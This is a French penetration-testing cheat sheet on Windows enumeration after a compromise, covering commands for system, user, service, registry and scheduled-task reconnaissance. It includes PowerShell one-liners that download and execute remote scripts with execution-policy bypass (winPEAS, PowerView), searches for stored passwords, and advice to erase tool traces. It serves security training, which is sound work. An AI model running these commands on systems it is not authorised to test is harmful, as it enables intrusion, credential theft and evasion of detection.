# Windows Enumeration

## 🗂️ Workflow d'énumération Windows
1. Identification du système (systeminfo, hostname, ver)
   ↓
2. Enumération des utilisateurs et groupes (net user, net localgroup)
   ↓
3. Enumération des services et processus (tasklist, sc query, wmic)
   ↓
4. Enumération des ports ouverts (netstat, Get-NetTCPConnection)
   ↓
5. Enumération des tâches planifiées (schtasks, at)
   ↓
6. Enumération des fichiers sensibles (SAM, SYSTEM, clés de registre)
   ↓
7. Enumération des failles connues (windows-exploit-suggester, winPEAS)

## 📋 Vue d'ensemble

L'énumération Windows post-compromise est cruciale pour identifier les voies d'escalade de privilèges et de mouvement latéral. Windows expose de nombreuses informations via ses outils intégrés et son registre.

> **💡 Explication Simple** : Une fois sur une machine Windows, on doit fouiller méthodiquement pour trouver des mots de passe stockés, des services mal configurés, ou des droits excessifs.

## 🔍 Phase 1 : Reconnaissance Système

### Informations système de base
```batch
# Informations système complètes
systeminfo

# Nom de la machine et domaine
hostname
echo %COMPUTERNAME%
echo %USERDOMAIN%

# Version Windows
ver
wmic os get Caption,Version,BuildNumber

# Architecture
wmic os get OSArchitecture
echo %PROCESSOR_ARCHITECTURE%

# Variables d'environnement importantes
set
echo %PATH%
echo %USERPROFILE%
```

### Informations réseau
```batch
# Configuration IP
ipconfig /all

# Table de routage
route print

# Table ARP
arp -a

# Connexions actives
netstat -ano
netstat -r

# Partages réseau
net share
net use

# DNS cache
ipconfig /displaydns
```

## 👥 Phase 2 : Énumération Utilisateurs et Groupes

### Utilisateurs locaux
```batch
# Lister tous les utilisateurs
net user

# Détails utilisateur spécifique
net user %username%
net user administrator

# Utilisateurs connectés
query user
qwinsta

# Historique des connexions
wmic netlogin get name,lastlogon,badpasswordcount
```

### Groupes et privilèges
```batch
# Groupes locaux
net localgroup

# Membres d'un groupe
net localgroup administrators
net localgroup "Remote Desktop Users"

# Privilèges de l'utilisateur actuel
whoami /all
whoami /priv
whoami /groups

# Sessions utilisateurs
net session
```

## ⚙️ Phase 3 : Services et Processus

### Énumération des services
```batch
# Tous les services
sc query type=service state=all

# Services en cours
net start
sc query type=service

# Détails d'un service
sc qc "service_name"
sc queryex "service_name"

# Services avec chemins complets
wmic service get name,displayname,pathname,startmode
```

### Processus en cours
```batch
# Liste des processus
tasklist
tasklist /svc

# Processus avec chemins complets
wmic process get name,processid,parentprocessid,executablepath

# Processus par utilisateur
tasklist /fi "username eq %username%"
```

## 📂 Phase 4 : Fichiers et Registre

### Fichiers sensibles
```batch
# Recherche de fichiers intéressants
dir /s /b C:\ | findstr /i password
dir /s /b C:\ | findstr /i config
dir /s /b C:\ | findstr /i .xml
dir /s /b C:\ | findstr /i unattend

# Fichiers récents
dir %USERPROFILE%\Recent
dir %USERPROFILE%\Desktop
dir %USERPROFILE%\Documents
```

### Registre Windows
```batch
# Informations système du registre
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion"

# Services installés
reg query HKLM\SYSTEM\CurrentControlSet\Services

# Programmes installés
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall

# AutoRun
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

## 🕐 Phase 5 : Tâches Planifiées

### Énumération des tâches
```batch
# Toutes les tâches planifiées
schtasks /query /fo LIST /v

# Tâches par dossier
schtasks /query /tn \Microsoft\Windows\

# Création de nouvelles tâches (si droits)
at
schtasks /create /?
```

## 🔧 Outils d'Énumération Automatisée

### winPEAS
```batch
# Téléchargement et exécution
powershell -c "iwr -uri 'https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe' -outfile 'winPEAS.exe'"
winPEAS.exe

# Version PowerShell
powershell -ep bypass -c "iex(iwr -uri 'https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')"
```

### Windows Exploit Suggester
```batch
# Collecter systeminfo
systeminfo > systeminfo.txt

# Analyser avec WES (côté attaquant)
python windows-exploit-suggester.py --database 2021-09-21-mssb.xls --systeminfo systeminfo.txt
```

### PowerSploit/PowerView
```powershell
# Import PowerView
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')

# Énumération domaine (si joint au domaine)
Get-NetDomain
Get-NetUser
Get-NetGroup
Get-NetComputer
```

## 🛡️ Conseils OPSEC
- Privilégier les commandes natives Windows avant les outils externes
- Éviter winPEAS en mode full sur des systèmes de production
- Ne jamais modifier la configuration sans autorisation explicite
- Utiliser des comptes à privilèges limités pour l'énumération
- Effacer les traces d'outils téléchargés après utilisation

## ⚠️ Erreurs fréquentes
- Oublier de vérifier les partages réseau accessibles (net share)
- Négliger les tâches planifiées et les services à démarrage automatique
- Lancer des scripts d'énumération trop verbeux qui laissent des traces dans les logs
- Ne pas sauvegarder les résultats d'énumération pour l'analyse offline
- Ignorer les informations du registre Windows (goldmine d'informations)

## 💡 Astuces
- Utiliser winPEAS pour une énumération automatisée et complète
- Croiser les résultats de plusieurs méthodes (manual + scripts + PowerShell)
- Scripter l'extraction des informations clés pour gagner du temps
- Chercher des mots de passe dans les fichiers de configuration (.xml, .config, .ini)
- Vérifier les autorun et les services avec des chemins non-quotés

## 🔗 Pour aller plus loin
- [PayloadsAllTheThings - Windows Enumeration](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources/Windows%20Privilege%20Escalation)
- [HackTricks - Windows](https://book.hacktricks.xyz/windows)
- [winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
- [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)

## 🧭 Navigation
- [Énumération Linux](./Linux_Enumeration.md)
- [Énumération Active Directory](./Active_Directory.md)
- [Outils d'énumération](../Tools-Enumeration/)
- [Retour à la méthodologie générale](../Guide-Enumeration-Pentest.md) 